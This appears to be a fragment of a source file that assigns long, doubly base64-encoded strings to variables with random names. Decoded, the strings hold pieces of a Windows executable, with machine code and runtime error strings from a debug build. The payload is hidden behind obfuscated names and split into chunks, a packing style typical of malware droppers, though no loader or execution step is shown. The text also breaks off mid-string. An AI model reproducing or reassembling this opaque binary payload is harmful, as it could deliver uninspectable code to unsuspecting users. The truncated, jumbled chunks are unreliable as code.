 oyVUxfArLNULzUIgjttUncrGNmKbJostRXGxgsrpsYA = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 EwWonYDzDhRymjiquMYqocSEJJnZeavOftPzjZfaMZlSaPmImpvcCmzJZjsywTyHKU = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 FWMyIMgY = "SWlVd2tDRWlEN0VoSWl3WEFtZ0FBU0lsRUpEQklnM3drTVA5MUxFaUxUQ1JRNklIVC8vK0Z3SFVNU0l0RUpGQklpVVFrSU9zSlNNZEVKQ0FBQUFBQVNJdEVKQ0RyTWVzdlNJdFVKRkJJalExN21nQUE2R3ZVLy8rRndIVU1TSXRFSkZCSWlVUWtLT3NKU01kRUpDZ0FBQUFBU0l0RUpDaElnOFJJdzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lsTUpBaElnK3c0U0lzRk9Kb0FBRWlKUkNRZ1NJTjhKQ0QvZFE1SWkwd2tRT2g4MC8vLzZ4M3JHMGlMUkNSQVNJbEVKQ2hJaTFRa0tFaU5EUWVhQUFEbzM5UC8vMGlEeERqRHpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSWxNSkFoSWcrdzRTSXRNSkVEb0l0TC8vMGlGd0hRS3gwUWtJQUFBQUFEckNNZEVKQ0QvLy8vL2kwUWtJRWlEeERqRHpNek16TXpNek16TXpNek16RUJYU0lQc1FFaU5SQ1FvU0l2NE04QzVDQUFBQVBPcVNJMU1KQ2ovRmNiUkFBQklpMFFrS0VpSlJDUWcveFdtMFFBQWk4QklpMHdrSUVnenlFaUx3VWlKUkNRZy94V20wUUFBaThCSWkwd2tJRWd6eUVpTHdVaUpSQ1FnU0kxTUpERC9GWkhSQUFDTFJDUXdTTUhnSUVnelJDUXdTSXRNSkNCSU04aElpOEZJaVVRa0lFaU5SQ1FnU0l0TUpDQklNOGhJaThGSWlVUWtJRWk0Ly8vLy8vLy9BQUJJaTB3a0lFZ2p5RWlMd1VpSlJDUWdTSXRFSkNCSWc4"
 LYYYgtKeNO = "RUFBQUZGTThESFJDUWdBQUFBQURQU004bm9YdkQvLzBpTHlFaUR4RGpwQy9ILy8waUR4RGpEek16TXpNek16TXpNek16TXpNek16TXhJZyt3NFFia0JBQUFBeDBRa0lBRUFBQUJGTThBejBqUEo2Qjd3Ly85SWc4UTR3OHpNek16TXpNek16TXpNek14SWlVd2tDRWlEN0RoSWkwUWtRRWlKUkNRZ1NJdEVKRUFQdGdDRndIUVlnejJPdUFBQUFIUVAveFVxOEFBQU9RV0F1QUFBZFFHUVNJUEVPTVBNek16TXpNek16TXpNek16TXpNek16TXpNekV5SlRDUWdUSWxFSkJoSWlWUWtFRWlKVENRSVNJUHNLRWlMUkNSSVRJdEFPRWlMVkNSSVNJdE1KRGpvSGZELy83Z0JBQUFBU0lQRUtNUE16TXpNek16TXpNek16TXpNek16TXpNek16TXpNVElsRUpCaElpVlFrRUVpSlRDUUlTSVBzV0VpTFJDUndpd0NENFBpSlJDUWdTSXRFSkdCSWlVUWtPRWlMUkNSd2l3REI2QUtENEFHRndIUXBTSXRFSkhCSVkwQUVTSXRNSkdCSUE4aElpOEZJaTB3a2NJdEpDUGZaU0dQSlNDUEJTSWxFSkRoSVkwUWtJRWlMVENRNFNJc0VBVWlKUkNRd1NJdEVKR2hJaTBBUWkwQUlTSXRNSkdoSUEwRUlTSWxFSkVCSWkwUWtZRWlKUkNRb1NJdEVKRUFQdGtBREpBOFB0c0NGd0hRbVNJdEVKRUFQdGtBRHdPZ0VKQThQdHNCcndCQkltRWlMVENRb1NBUElTSXZCU0lsRUpDaElpMFFrS0VpTFRDUXdTRFBJU0l2QlNJbEVKREJJaTB3a01Pam03"
 pheHdhgetPucMsVcfiHrhrcpKwuklhIYmvBQvkydUigvKCAfHsihqnpAmpTZhDTZR = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 NXKmCFlWcjX = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQVlBQUFBR0FBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQkFBQUFNQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBUUFKQkFBQVNBQUFBSEJCQWdCOUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 QUukdsuDLJmKubdyASnDeGkASEJCcErPLDLhGtHDhngKqmI = "Ly8vU0lQRVdNUE16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek14bVpnOGZoQUFBQUFBQVNEc040YTBBQUhVUVNNSEJFR2Izd2YvL2RRSERTTUhKRU9rbTd2Ly96TXpNek16TXpNek16TXpNek16TXpNek1TSVBzS09obDd2Ly82TUx3Ly8vb3JPMy8vN2tCQUFBQTZHL3UvLzhQdHNDRndIVUt1UWNBQUFEb2lmRC8vK2hzNy8vL1NJME5rdS8vLytpNzd2Ly82SDd2Ly8rRndIUUt1UWNBQUFEb1pmRC8vK2dJN3YvLzZIcnYvLytGd0hRTVNJME44KzMvLytoYjcvLy82S3J3Ly8vb1ErNy8vK2lvN2YvL2k4am9TKzcvLytqTjd2Ly9EN2JBaGNCMEJlaEo3di8vNlAzdS8vL29nL0QvLzRYQWRBcTVCd0FBQU9nTThQLy9NOEJJZzhRb3c4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNeElnK3dvNkpmdi8vOHp3RWlEeENqRHpNek16TXpNek16TXpNek16TXpNekVpRDdDam8wdTcvLytnZjdmLy9pOGpvWnUvLy8waUR4Q2pEek16TXpNek1TSVBzS09nQzcvLy82QklBQUFCSWc4UW93OHpNek16TXpNek16TXpNek14SWcreG91UUVBQUFEbzYrLy8vdysyd0lYQWRRcTVCd0FBQU9oWTcvLy94a1FrSUFEb1l1Ly8vNGhF"
 EtChjxuOXhmrIvqKWXIxaPTAo = "T2xjTkFBQTZTMUpBQURwZGtrQUFPbE5IZ0FBNlVSS0FBRHBKMG9BQU9sK0RRQUE2WWtUQUFEcExra0FBT21QTkFBQTZReEpBQURwVlM4QUFPa3dNd0FBNmROSUFBRHBsRWtBQU9tQlNnQUE2WkJKQUFEcGgwb0FBT2swU2dBQTZWMUtBQURwNkFzQUFPa3pGd0FBNmZaSkFBRHBxVWtBQU9uMEJRQUE2UzhVQUFEcEdqSUFBT2xsU2dBQTZTQXRBQURwS3pjQUFPa1dTZ0FBNllkSkFBRHBIQzhBQU9rbkxnQUE2UUlnQUFEcFRUZ0FBT25JUGdBQTZiTW5BQURwK0VnQUFPbGxTUUFBNllRbUFBRHB2MGdBQU9uNkxnQUE2ZFZKQUFEcDFFZ0FBT2xMTGdBQTZmWXVBQURwUTBrQUFPbjhOUUFBNmVjMEFBRHA0aVVBQU9tVFNBQUE2ZWdwQUFEcC8wY0FBT21PQ2dBQTZTbERBQURwNUM0QUFPbjVTQUFBNlV4SUFBRHBKU1VBQU9rd0pRQUE2VnNUQUFEcGhnd0FBT214TkFBQTZRcElBQURwOVVnQUFPbCtTQUFBNlNkSkFBRHBpQndBQU9sTFNBQUE2VFpKQUFEcE5VZ0FBT2trSFFBQTZROFVBQURweWd3QUFPbUxSd0FBNllBdEFBRHA2ekFBQU9sNFNBQUE2U0VtQUFEcERBUUFBT25IUndBQTZmSW1BQURwZTBjQUFPa0lOQUFBNlZNd0FBRHAzaVVBQU9raFNBQUE2WFJIQUFEcDN4OEFBT2xxSmdBQTZhbElBQURwZ0FrQUFPbDdTQUFBNlRZTUFBRE16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 oOrwvvNKQtFkUDWgRQhpLEADLhCWJvZqBTozLaRsgikdVKGHTEGzXBpY = "QWxBQkJBRUFCRUlBQUFFSkFRQUpRZ0FBR1I4RkFBMDBpUUFOQVlZQUJuQUFBRThSQVFBZ0JBQUFBQUFBQUJra0J3QVNaSXNBRWpTS0FCSUJoZ0FMY0FBQVR4RUJBQ0FFQUFBQUFBQUFHUjhHQUEwQlB3QUc0QVJ3QTJBQ1VFOFJBUURnQVFBQUFBQUFBQ0VJQWdBSU5ENEFjQ2NCQU04bkFRQlV5QUVBQUFBQUFDRUFBQUJ3SndFQXp5Y0JBRlRJQVFBQUFBQUFBUlFJQUJSa0NnQVVWQWtBRkRRSUFCUlNFSEFBQUFBQUFRNEJBQTVpQUFBWkJBRUFCRUlBQUdZVEFRQUJBQUFBcEM0QkFMb3VBUUFRZ1FFQXVpNEJBQUFBQUFBQkJnSUFCaklDVUFFRUFRQUVvZ0FBQVFRQkFBU2lBQUFaYkFzQWJHVFZBUk1CMWdFTThBcmdDTkFHd0FSd0ExQUNNQUFBVHhFQkFKQU9BQUFBQUFBQUFSQUZBQkJDRFBBSzBBakFCbUFBQUFBQUFBQWhIUWdBSGVRRUFCVjBEUUFOVkF3QUJUUUtBS0FxQVFETktnRUFJTWtCQUFBQUFBQWhBQUFBb0NvQkFNMHFBUUFneVFFQUFBQUFBQUVJQVFBSVFnQUFBUkVCQUJGaUFBQUJCQUVBQkVJQUFBRUpBUUFKWWdBQUFRa0JBQW5pQUFBQkNRRUFDZUlBQUFFSkFRQUpRZ0FBQVFrQkFBbGlBQUFCQ1FFQUNZSUFBQUVKQVFBSllnQUFDUWtCQUFtaUFBQXlFQUVBQVFBQUFFODhBUUN5UEFFQVFJRUJBTEk4QVFBQUFBQUFBUVlDQUFZeUFsQUJCQUVBQklJQUFBRUlBUUFJUWdBQUFRZ0JBQWhDQUFB"
 SvHaIFYrqYWuSmKFOoPXtUOnfQUrNUfyjodbbRYy = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 WeHDIoVkYMAsJRIxIXO = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 HTLdEBDxvDgWgMPvvDcMsvqvLYa = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRkFWQWdBQUFBQUFBQUFBQUlvWUFnQlFFUUlBK0JVQ0FBQUFBQUFBQUFBQVJoc0NBUGdSQWdBQUZBSUFBQUFBQUFBQUFBQnNIUUlBQUJBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEzQndDQUFBQUFBQnFHd0lBQUFBQUFINGJBZ0FBQUFBQWtCc0NBQUFBQUFDbUd3SUFBQUFBQUx3YkFnQUFBQUFBMEJzQ0FBQUFBQURxR3dJQUFBQUFBUDRiQWdBQUFBQUFXaDBDQUFBQUFBQk1IUUlBQUFBQUFEd2RBZ0FBQUFBQUtoMENBQUFBQUFBZUhRSUFBQUFBQUJJZEFnQUFBQUFBQWgwQ0FBQUFBQUR1SEFJQUFBQUFBRlFiQWdBQUFBQUF4aHdDQUFBQUFBQ3NIQUlBQUFBQUFKWWNBZ0FBQUFBQWZCd0NBQUFBQUFCZ0hBSUFBQUFBQUV3Y0FnQUFBQUFBT0J3Q0FBQUFBQUFhSEFJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBY2hnQ0FBQUFBQUJZR0FJQUFBQUFBRHdZQWdBQUFBQUFIaGdDQUFBQUFBQUlHQUlBQUFB"
 hnDgZgRNZjLm = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUlBRjlmUTE5emNHVmphV1pwWTE5b1lXNWtiR1Z5QUFBSkFGOWZRMTl6Y0dWamFXWnBZMTlvWVc1a2JHVnlYMjV2WlhoalpYQjBBQ1VBWDE5emRHUmZkSGx3WlY5cGJtWnZYMlJsYzNSeWIzbGZiR2x6ZEFBQUd3QmZYMk4xY25KbGJuUmZaWGhqWlhCMGFXOXVBQndBWDE5amRYSnlaVzUwWDJWNFkyVndkR2x2Ymw5amIyNTBaWGgwQUM0QVgxOTJZM0owWDBkbGRFMXZaSFZzWlVacGJHVk9ZVzFsVndBdkFGOWZkbU55ZEY5SFpYUk5iMlIxYkdWSVlXNWtiR1ZYQURFQVgxOTJZM0owWDB4dllXUk1hV0p5WVhKNVJYaFhBRlpEVWxWT1ZFbE5SVEUwTUVRdVpHeHNBRFVBWDE5aFkzSjBYMmx2WWw5bWRXNWpBRndBWDE5emRHUnBiMTlqYjIxdGIyNWZkbVp3Y21sdWRHWUFNUVZ6ZEhKc1pXNEFBQVFBWDBOeWRFUmlaMUpsY0c5eWRBQUZBRjlEY25SRVltZFNaWEJ2Y25SWEFBRERBbDl6WldoZlptbHNkR1Z5WDJWNFpRREdBbDl6WlhSZllYQndYM1I1Y0dVQVd3QmZYM05sZEhWelpYSnRZWFJvWlhKeUFBQzJBRjlqYjI1bWFXZDFjbVZmYm1GeWNtOTNYMkZ5WjNZQUFIRUJYMmx1YVhScFlXeHBlbVZmYm1GeWNtOTNYMlZ1ZG1seWIyNXRaVzUwQUFBOUFWOW5a"
 CmIiDOtlbfTzeZwoJcMPoXEambQWUqgMmWTIgJdnQazyI = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBeFJNQlFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 WKMrozPvTpOFCSNgWtqwjGpRhnutJbgPjzC = "RFBFU0ltRUpDQUVBQUNMUFdhbUFBQklpOXBJaS9HRC8vOTBkWUE2QUhSWlNJdks2SzRCQUFCSWc4QXRTRDBBQkFBQWQwVk1qUVZyZ3dBQXVnQUVBQUJJalV3a0lPZ2Y1Ly8vVEl2RFNJMU1KQ0M2QUFRQUFPZ081di8vVEkwRlk0TUFBTG9BQkFBQVNJMU1KQ0RvK09YLy8weU5UQ1FnNndkTWpRMHVpQUFBUWJnQ0FBQUFpOWRJaTg3b1pnRUFBRWlMakNRZ0JBQUFTRFBNNkYvbi8vOU1qWndrTUFRQUFFbUxXeUJKaTNNb1NZdmpYOFBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekVpSlZDUVFWa0ZVUVZWQlYwaUQ3Q2hGTS8rK0VBQUFBRXc3emsyTDRFaUx3a3lMNlVrUFF2RkloZlowYTBpSlhDUlFUQ3ZoU0lsc0pHQklpK3BJaVh3a2FFaUwrVXlKZENRZ1JZMTNNVXlML2tFUHRodzhUSTBGaTRjQUFFU0x5MG1MMWtpTHplano1di8vU1lQdUE0Z2ZTSVBGQTBpTmZ3RklnKzRCZGRKSWkwUWtXRXlMZENRZ1NJdDhKR2hJaTJ3a1lFaUxYQ1JRU28wRWVFUEdCQzhBUWNZRUJ3QklnOFFvUVY5QlhVRmNYc1BNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0l2QkQ3WVFTUC9BaE5KMTlrZ3J3VWoveU1QTXpNek16TXpNek16TXpNeEFVMVZY"
 jGEvPHTyQBgJGqDSXfaWZVOnnAKsLSeSzLTydie = "QUFBQUFBQUFBQUFBQUFBQUFGTjBZV05ySUcxbGJXOXllU0IzWVhNZ1kyOXljblZ3ZEdWa0RRb0FBQUFBQUFBQUFBQUFBQUJCSUd4dlkyRnNJSFpoY21saFlteGxJSGRoY3lCMWMyVmtJR0psWm05eVpTQnBkQ0IzWVhNZ2FXNXBkR2xoYkdsNlpXUU5DZ0FBQUFBQUFBQUFBQUFBVTNSaFkyc2diV1Z0YjNKNUlHRnliM1Z1WkNCZllXeHNiMk5oSUhkaGN5QmpiM0p5ZFhCMFpXUU5DZ0FBQUFBQUFBQUFBQUFBQUFCVmJtdHViM2R1SUZKMWJuUnBiV1VnUTJobFkyc2dSWEp5YjNJTkNnQUFBQUFBQUFBQUFBQUFVZ0IxQUc0QWRBQnBBRzBBWlFBZ0FFTUFhQUJsQUdNQWF3QWdBRVVBY2dCeUFHOEFjZ0F1QUEwQUNnQWdBRlVBYmdCaEFHSUFiQUJsQUNBQWRBQnZBQ0FBWkFCcEFITUFjQUJzQUdFQWVRQWdBRklBVkFCREFDQUFUUUJsQUhNQWN3QmhBR2NBWlFBdUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFVZ0IxQUc0QUxRQlVBR2tBYlFCbEFDQUFRd0JvQUdVQVl3QnJBQ0FBUmdCaEFHa0FiQUIxQUhJQVpRQWdBQ01BSlFCa0FDQUFMUUFnQUNVQWN3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQlZibXR1YjNkdUlFWnBiR1Z1WVcxbEFBQUFBQUFBQUFCVmJtdHViM2R1SUUxdlpIVnNaU0JPWVcxbEFBQUFBQUJTZFc0dFZHbHRaU0JEYUdWamF5QkdZV2xzZFhK"
 gSTHkqRczwLplVanyWeaUyULjTzKvwEPRiOvqnhzYyCjb = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF